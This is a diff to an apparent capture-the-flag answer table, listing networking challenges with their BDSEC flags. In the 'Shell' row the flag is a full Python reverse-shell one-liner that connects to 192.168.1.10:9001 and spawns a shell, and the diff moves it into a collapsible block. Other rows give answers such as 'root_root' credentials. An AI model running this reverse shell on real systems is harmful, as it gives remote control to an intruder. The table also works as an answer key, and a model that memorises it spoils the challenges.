@@ -52,7 +52,7 @@ The goal is to solve cybersecurity tests in various categories. The validation o
 | Project Incharge | Networking        | TareqAhamed   | 50     | ✔ | `` |
 | Loooon Looong | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{Thu_Jul_14_10:16:59}` |
 | Administrator | Networking        | TareqAhamed   | 50     | ✔ | `` |
-| Shell | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{python -c 'import socket,  subprocess,os;s=socket.socket(socket.AF_INET,  socket.SOCK_STREAM);s.connect(("192.168.1.10",9001));  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);  os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'}` |
+| Shell | Networking        | TareqAhamed   | 50     | ✔ | <details><summary>`BDSEC{....`</summary>`BDSEC{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'}`</details> |
 | Secret Key | Networking        | TareqAhamed   | 50     | ✔ | `` |
 | Database Admin | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{root_root}` |
 | HostName | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{ftpadmin}` |
